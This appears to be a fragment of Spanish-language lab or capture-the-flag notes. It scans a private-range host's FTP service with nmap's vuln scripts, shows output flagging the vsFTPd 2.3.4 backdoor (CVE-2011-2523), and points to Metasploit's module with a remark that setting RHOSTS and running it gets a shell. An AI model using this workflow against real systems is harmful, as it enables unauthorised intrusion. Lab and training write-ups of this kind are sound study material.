
----

-----

### Scan de la vuln
```
sudo nmap --script="vuln" -p21 192.168.3.97 
```

- Output
```bash
ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  
```

```bash
msfconsole -q    
search vsftpd 2.3.4

//ya de aqui no tiene pierde, set RHOSTS, run y pa dentro
```

